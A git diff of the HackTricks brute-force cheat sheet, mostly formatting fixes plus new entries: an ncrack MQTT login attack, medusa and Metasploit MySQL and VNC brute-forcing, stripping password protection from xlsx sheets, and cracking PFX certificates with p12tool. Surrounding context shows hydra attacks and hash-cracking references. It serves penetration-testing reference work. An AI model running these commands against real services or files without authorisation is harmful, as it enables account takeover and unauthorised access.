@@ -1,11 +1,11 @@
 # Brute Force - CheatSheet
 
 {% hint style="danger" %}
-Do you use **Hacktricks every day**? Did you find the book **very** **useful**? Would you like to **receive extra help** with cybersecurity questions? Would you like to **find more and higher quality content on Hacktricks**?  
+Do you use **Hacktricks every day**? Did you find the book **very** **useful**? Would you like to **receive extra help** with cybersecurity questions? Would you like to **find more and higher quality content on Hacktricks**?\
 [**Support Hacktricks through github sponsors**](https://github.com/sponsors/carlospolop) **so we can dedicate more time to it and also get access to the Hacktricks private group where you will get the help you need and much more!**
 {% endhint %}
 
-If you want to know about my **latest modifications**/**additions** or you have **any suggestion for HackTricks** or **PEASS**, **join the** [**💬**](https://emojipedia.org/speech-balloon/)[**telegram group**](https://t.me/peass), or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**  
+If you want to know about my **latest modifications**/**additions** or you have **any suggestion for HackTricks** or **PEASS**, **join the** [**💬**](https://emojipedia.org/speech-balloon/)[**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass), or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**\
 If you want to **share some tricks with the community** you can also submit **pull requests** to [**https://github.com/carlospolop/hacktricks**](https://github.com/carlospolop/hacktricks) that will be reflected in this book and don't forget to **give ⭐** on **github** to **motivate** **me** to continue developing this book.
 
 ## Default Credentials
@@ -21,7 +21,8 @@ If you want to **share some tricks with the community** you can also submit **pu
 * [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
 * [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
 * [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
-* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com/)
+* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
+* [**https://many-passwords.github.io/**](https://many-passwords.github.io)\*\*\*\*
 
 ## **Create your own Dictionaries**
 
@@ -48,9 +49,9 @@ cewl example.com -m 5 -w words.txt
 
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generate passwords based on your knowledge of the victim \(names, dates...\)
+Generate passwords based on your knowledge of the victim (names, dates...)
 
-```text
+```
 python3 cupp.py -h
 ```
 
@@ -101,13 +102,13 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 
 ### Docker Registry
 
-```text
+```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
 
 ### Elasticsearch
 
-```text
+```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 
@@ -140,7 +141,7 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 
 For http**s** you have to change from "http-post-form" to "**https-post-form"**
 
-### **HTTP - CMS --** \(W\)ordpress, \(J\)oomla or \(D\)rupal or \(M\)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
@@ -197,6 +198,12 @@ jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibm
 nmap --script ldap-brute -p 389 <IP>
 ```
 
+### MQTT
+
+```
+ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
+```
+
 ### Mongo
 
 ```bash
@@ -207,8 +214,14 @@ use auxiliary/scanner/mongodb/mongodb_login
 ### MySQL
 
 ```bash
+# hydra
 hydra -L usernames.txt -P pass.txt <IP> mysql
+
+# msfconsole
 msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
+
+# medusa
+medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
 ```
 
 ### OracleSQL
@@ -241,7 +254,7 @@ In order to use **oracle\_login** with **patator** you need to **install**:
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline OracleSQL hash bruteforce](pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) \(**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**\):
+[Offline OracleSQL hash bruteforce](pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -386,6 +399,11 @@ medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
 patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+
+#Metasploit
+use auxiliary/scanner/vnc/vnc_login
+set RHOSTS <ip>
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```
 
 ### Winrm
@@ -398,16 +416,16 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 
 ### Online cracking databases
 
-* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) \(MD5 & SHA1\)
-* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com/) \(Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...\)
-* [https://crackstation.net/](https://crackstation.net/) \(Hashes\)
-* [https://md5decrypt.net/](https://md5decrypt.net/) \(MD5\)
-* [https://gpuhash.me/](https://gpuhash.me/) \(Hashes and file hashes\)
-* [https://hashes.org/search.php](https://hashes.org/search.php) \(Hashes\)
-* [https://www.cmd5.org/](https://www.cmd5.org/) \(Hashes\)
-* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) \(MD5, NTLM, SHA1, MySQL5, SHA256, SHA512\)
-* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) \(MD5\)
-* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com/)
+* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
+* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+* [https://crackstation.net/](https://crackstation.net) (Hashes)
+* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
+* [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
+* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
+* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
+* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
+* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
 Check this out before trying to bruteforce a Hash.
 
@@ -534,6 +552,28 @@ gpg2john private_pgp.key #This will generate the hash, save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 ```
 
+### Open Office Pwd Protected Column
+
+If you have xlsx file with a column protected by password you can unprotect it:
+
+* **Upload it to google drive** and the password will be automatically removed
+* To **remove** it **manually**:
+
+```bash
+unzip file.xlsx
+grep -R "sheetProtection" ./*
+# Find something like: <sheetProtection algorithmName="SHA-512"hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
+# Remove that line and rezip the file
+zip -r file.xls .
+```
+
+### PFX Certificates
+
+```bash
+# From https://github.com/Ridter/p12tool
+./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
+```
+
 ## Tools
 
 **Hash examples:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
@@ -562,7 +602,7 @@ hashcat --example-hashes | grep -B1 -A2 "NTLM"
 
 Cracking Linux Hashes - /etc/shadow file
 
-```text
+```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
@@ -571,14 +611,14 @@ Cracking Linux Hashes - /etc/shadow file
 
 Cracking Windows Hashes
 
-```text
+```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
 
 Cracking Common Application Hashes
 
-```text
+```
   900 | MD4                                              | Raw Hash
     0 | MD5                                              | Raw Hash
  5100 | Half MD5                                         | Raw Hash
@@ -587,4 +627,3 @@ Cracking Common Application Hashes
  1400 | SHA-256                                          | Raw Hash
  1700 | SHA-512                                          | Raw Hash
 ```
-
